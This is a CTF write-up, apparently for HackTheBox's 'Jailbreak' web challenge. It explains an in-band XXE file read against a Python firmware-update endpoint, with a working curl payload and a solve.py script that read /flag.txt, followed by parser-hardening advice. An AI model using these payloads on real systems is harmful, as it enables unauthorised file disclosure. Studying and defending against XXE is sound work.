---
layout: post
title: "Jailbreak"
date: 2027-07-10 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, xxe, xml-external-entity, cwe-611, python, flask, file-read]
---

## Overview

Jailbreak is an Easy Web challenge themed around jailbreaking a Fallout Pip-Boy device to unlock Vault 79. The app exposes a firmware-update endpoint that parses user-supplied XML without disabling external entity resolution, making it a textbook in-band [XML External Entity (XXE)](https://cwe.mitre.org/data/definitions/611.html) read. One crafted POST and the flag leaks straight back in the response.

## The Technique

[XML External Entity (XXE) injection](https://cwe.mitre.org/data/definitions/611.html) — [CWE-611](https://cwe.mitre.org/data/definitions/611.html) — occurs when an XML parser resolves `SYSTEM` entities from attacker-controlled input. By declaring a custom entity that points at a local file (`<!ENTITY xxe SYSTEM "file:///flag.txt">`), and referencing it inside an element whose value is echoed back in the response, we read arbitrary files from the server.

The key nuance here is Python-specific: including an XML encoding declaration (`<?xml version="1.0" encoding="UTF-8"?>`) causes Python's parser to raise `UnicodeDecodeError`. The payload must start directly with `<!DOCTYPE ...>` — no declaration at all.

## Solution

The vulnerable endpoint is `POST /api/update` with `Content-Type: application/xml`. The `<Version>` element is parsed and reflected in the response message.

Send the XXE payload directly with `curl`:

```bash
curl -s http://<target>/api/update \
  -H "Content-Type: application/xml" \
  --data '<!DOCTYPE FirmwareUpdateConfig [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]><FirmwareUpdateConfig><Firmware><Version>&xxe;</Version></Firmware></FirmwareUpdateConfig>'
```

Response:

```json
{"message": "Firmware version HTB{...} update initiated."}
```

The flag is embedded where the `<Version>` value was substituted.

`solve.py` for scripted delivery:

```python
#!/usr/bin/env python3
import requests, sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "<target:port>"
URL = f"http://{TARGET}/api/update"

# No XML declaration — Python parsers reject encoding= in the declaration
payload = (
    '<!DOCTYPE FirmwareUpdateConfig [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>'
    '<FirmwareUpdateConfig><Firmware><Version>&xxe;</Version></Firmware></FirmwareUpdateConfig>'
)

r = requests.post(URL, data=payload, headers={"Content-Type": "application/xml"})
print(r.json()["message"])
```

## Why It Worked

Python's XML parser (and `lxml` in its default configuration) resolves `SYSTEM` entities when external entity loading is not explicitly disabled. The application used neither `defusedxml` nor `resolve_entities=False`, so the DTD declaration was honoured and the file contents were substituted into `<Version>` before the response was built.

The reflected `<Version>` value is what turns a blind XXE into an in-band file read — no out-of-band channel needed.

## Fix / Defense

Disable external entity resolution at the parser level:

```python
# Drop-in replacement — defusedxml disables DTD and entity resolution entirely
import defusedxml.ElementTree as ET
tree = ET.fromstring(xml_body)

# Or with lxml, configure the parser explicitly
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True)
tree = etree.fromstring(xml_body.encode(), parser)
```

Never pass user-controlled XML to a parser with entity resolution enabled, and never reflect parsed XML node values back in responses without sanitisation. If XML is not required, prefer JSON.
